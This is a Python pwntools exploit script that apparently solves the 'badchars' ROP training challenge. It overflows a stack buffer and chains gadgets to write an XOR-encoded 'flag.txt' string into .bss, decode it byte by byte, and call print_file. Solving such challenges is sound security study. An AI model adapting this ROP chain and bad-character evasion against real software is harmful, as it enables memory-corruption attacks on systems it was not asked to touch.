from pwn import * 

elf=ELF("badchars")
r=ROP([elf])
p=process(elf.path)

ret = r.find_gadget(["ret"])[0]
pop_r12=r.find_gadget(["pop r12","pop r13","pop r14","pop r15","ret"])[0]
flag_xored = bytes([b ^ 0x33 for b in b"flag.txt"])
print(flag_xored)
#mov qword ptr [r13], r12; ret; 
mov_r12=0x0000000000400634
xor=elf.sym.usefulGadgets
pop_r14=r.find_gadget(["pop r14","pop r15","ret"])[0]
pop_r15=r.find_gadget(["pop r15","ret"])[0]
pop_rdi=r.find_gadget(["pop rdi","ret"])[0]
p.recvuntil(b'>')
payload=b'A'*40

#we cannot insert [x,g,a,.]

payload+=p64(pop_r12)+flag_xored+p64(elf.bss())+p64(0)+p64(0)
payload+=p64(mov_r12)

payload+=p64(pop_r14)+p64(0x33)+p64(elf.bss())
payload+=p64(xor)

for i in range (1,8):
	payload+=p64(pop_r15)+p64(elf.bss()+i)
	payload+=p64(xor)

payload+=p64(pop_rdi)+p64(elf.bss())
payload+=p64(elf.sym.print_file)

p.send(payload)
print(p.recvuntil(b'}'))